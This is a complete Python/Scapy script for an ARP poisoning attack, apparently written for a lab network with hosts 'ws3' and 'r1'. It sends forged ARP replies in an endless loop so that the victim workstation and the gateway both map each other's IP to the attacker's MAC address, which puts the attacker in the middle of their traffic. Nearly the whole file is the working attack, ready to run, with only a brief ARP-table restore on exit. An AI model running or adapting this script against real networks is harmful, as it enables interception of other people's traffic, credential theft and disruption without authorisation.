#!/usr/bin/env python3

import time
import sys
import logging
from scapy.all import Ether, ARP, srp, sendp, conf, get_if_list

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0

VICTIM_IP = "10.1.0.3"      # ip address of workstation to poison (ws3)
GATEWAY_IP = "10.1.0.1"     # ip address of gateway (r1) we are impersonating
SEND_INTERVAL = 2           # delay

def get_valid_interface():
    """Find a valid interface to use for the attack
    
    return: valid interface name or None if none found
    """
    interfaces = get_if_list()
    valid_interfaces = [iface for iface in interfaces if not iface.startswith('lo')]
    
    print(f"[*] Available interfaces: {valid_interfaces}")
    
    if not valid_interfaces:
        return None
    
    eth_interfaces = [iface for iface in valid_interfaces if 'eth' in iface]
    if eth_interfaces:
        return eth_interfaces[0]
    
    return valid_interfaces[0]

def get_mac(ip_address, iface):
    """Get MAC address for an IP using ARP request (fallback method)
    
    param ip_address: IP address to resolve
    param iface: interface to use
    return: MAC address or None if not found
    """
    try:
        # create arpr equest
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address)
        # Send packet and get response
        result = srp(arp_request, timeout=3, iface=iface, verbose=0)[0]
        
        # Return MAC from response
        if result:
            return result[0][1].hwsrc
    except Exception as e:
        print(f"[!] Error in ARP request for {ip_address}: {e}")
    
    # If we fail we try a sys command
    try:
        import subprocess
        subprocess.call(f"ping -c 1 -W 1 {ip_address} > /dev/null 2>&1", shell=True) # ping the host
        result = subprocess.check_output(f"arp -n {ip_address}", shell=True).decode() # get the arp cache entry
        import re
        mac_match = re.search(r'([0-9a-f]{2}(?::[0-9a-f]{2}){5})', result, re.IGNORECASE)
        if mac_match:
            return mac_match.group(1)
    except Exception as e:
        print(f"[!] System command fallback failed: {e}")
    
    return None

def get_attacker_mac(iface):
    """Get our own MAC address
    
    param iface: interface to use
    return: MAC address of the attacker"""
    try:
        from scapy.all import get_if_hwaddr
        return get_if_hwaddr(iface)
    except Exception as e:
        print(f"[!] Error getting attacker MAC with Scapy: {e}")
        try:
            import subprocess
            import re
            result = subprocess.check_output(f"ip link show {iface}", shell=True).decode()
            mac_match = re.search(r'link/ether ([0-9a-f:]+)', result)
            if mac_match:
                return mac_match.group(1)
        except Exception as e:
            print(f"[!] Error getting MAC with system command: {e}")
    
    return None

print("[*] Starting ARP Poisoning attack...")
interface = get_valid_interface()
if not interface:
    print("[!] No valid interface found. Exiting.")
    sys.exit(1)

print(f"[*] Using interface: {interface}")
print(f"[*] Target: {VICTIM_IP}")
print(f"[*] Impersonating Gateway: {GATEWAY_IP}")

# Get attacker MAC address
attacker_mac = get_attacker_mac(interface)
if not attacker_mac:
    print("[!] Failed to get attacker MAC address. Exiting.")
    sys.exit(1)
print(f"[*] Attacker MAC: {attacker_mac}")

# Try to get victim MAC
victim_mac = get_mac(VICTIM_IP, interface)
if not victim_mac:
    print("[!] Could not resolve victim MAC. Using broadcast.")
    victim_mac = "ff:ff:ff:ff:ff:ff"
else:
    print(f"[*] Found Victim MAC: {victim_mac}")

# Try to get gateway MAC
gateway_mac = get_mac(GATEWAY_IP, interface)
if not gateway_mac:
    print("[!] Could not resolve gateway MAC. Using broadcast.")
    gateway_mac = "ff:ff:ff:ff:ff:ff"
else:
    print(f"[*] Found Gateway MAC: {gateway_mac}")

try:
    packet_count = 0
    while True:
        # Poison the victim's arp cache (tell the victim we are the gateway)
        victim_packet = Ether(dst=victim_mac)/ARP(
            op=2,                  # op=2 for ARP reply
            pdst=VICTIM_IP,
            hwdst=victim_mac,
            psrc=GATEWAY_IP,       # pretend to be the gateway
            hwsrc=attacker_mac     # our MAC
        )
        
        # Poison the gateway's arp cache (tell the gateway we are the victim)
         # this is crucial otherwise the gateway will not send packets to us
        gateway_packet = Ether(dst=gateway_mac)/ARP(
            op=2,                  # op=2 for ARP reply
            pdst=GATEWAY_IP,
            hwdst=gateway_mac,
            psrc=VICTIM_IP,        # pretend to be the victim
            hwsrc=attacker_mac     # our MAC
        )
        
        sendp(victim_packet, iface=interface, verbose=0)
        sendp(gateway_packet, iface=interface, verbose=0)
        
        packet_count += 2
        if packet_count % 10 == 0:
            print(f"[*] Sent {packet_count} packets...")
        
        time.sleep(SEND_INTERVAL)

except KeyboardInterrupt:
    print("\n[*] Stopping ARP Poisoning attack.")
    
    # Try to restore arp tables when interrupt
    if victim_mac != "ff:ff:ff:ff:ff:ff" and gateway_mac != "ff:ff:ff:ff:ff:ff":
        print("[*] Restoring ARP tables...")
        for _ in range(5):
            # Tell victim that gateway has its real MAC
            # undoing the poison
            restore_victim = Ether(dst=victim_mac)/ARP(
                op=2,
                pdst=VICTIM_IP,
                hwdst=victim_mac,
                psrc=GATEWAY_IP,
                hwsrc=gateway_mac
            )
            # Tell gateway that victim has its real MAC
            # undoing the poison
            restore_gateway = Ether(dst=gateway_mac)/ARP(
                op=2,
                pdst=GATEWAY_IP,
                hwdst=gateway_mac,
                psrc=VICTIM_IP,
                hwsrc=victim_mac
            )
            
            sendp(restore_victim, iface=interface, verbose=0)
            sendp(restore_gateway, iface=interface, verbose=0)
            time.sleep(0.2)
        print("[*] ARP tables restored.")
    
    sys.exit(0)
except Exception as e:
    print(f"\n[!] An error occurred: {e}")
    sys.exit(1)